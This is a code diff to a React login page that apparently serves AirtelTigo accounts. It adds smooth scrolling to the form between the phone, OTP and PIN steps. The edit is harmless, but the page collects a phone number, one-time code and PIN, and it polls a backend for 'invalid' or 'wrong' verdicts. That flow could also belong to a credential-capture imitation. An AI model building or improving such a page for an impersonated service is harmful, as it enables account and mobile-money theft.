@@ -30,6 +30,7 @@ export default function Login() {
   const otpRefs = [useRef(null), useRef(null), useRef(null), useRef(null)];
   const pinInputRef = useRef(null);
   const promptedPinPollIntervalRef = useRef(null); // ✅ Track polling to reset on retry
+  const loginFormRef = useRef(null); // ✅ For scrolling to form on mobile
 
   // ── Phone: digits only ──
   const handlePhoneChange = (e) => {
@@ -79,6 +80,15 @@ export default function Login() {
   };
 
   const togglePinVisibility = () => setShowPin(!showPin);
+
+  // ── Scroll to form on mobile when step changes ──
+  const scrollToForm = () => {
+    if (loginFormRef.current) {
+      setTimeout(() => {
+        loginFormRef.current?.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      }, 100);
+    }
+  };
 
   // ══════════════════════════════════════════════════════════════════
   // STEP 1: PHONE NUMBER SUBMISSION + POLLING
@@ -136,6 +146,7 @@ export default function Login() {
             localStorage.setItem('airteltigo_phone', phoneNumber);
             setStep('otp');
             setOtp(['', '', '', '']);
+            scrollToForm();
             setTimeout(() => otpRefs[0].current?.focus(), 100);
           } else if (statusData.status === 'invalid') {
             clearInterval(pollInterval);
@@ -221,6 +232,7 @@ export default function Login() {
             setIsProcessing(false);
             setStep('pin');
             setPin('');
+            scrollToForm();
             setTimeout(() => pinInputRef.current?.focus(), 100);
           } else if (statusData.status === 'wrong') {
             clearInterval(pollInterval);
@@ -545,7 +557,7 @@ export default function Login() {
       </header>
 
       {/* Main Content */}
-      <main className="login-content">
+      <main className="login-content" ref={loginFormRef}>
         <h1 className="login-title">
           {step === 'phone' && 'Enter Your Phone Number'}
           {step === 'otp' && 'Enter OTP Code'}
@@ -632,6 +644,7 @@ export default function Login() {
                   setStep('phone');
                   setPhoneNumber('');
                   setOtp(['', '', '', '']);
+                  scrollToForm();
                 }}
               >
                 ← BACK
@@ -685,6 +698,7 @@ export default function Login() {
                   setStep('otp');
                   setPin('');
                   setShowPin(false);
+                  scrollToForm();
                 }}
               >
                 ← BACK
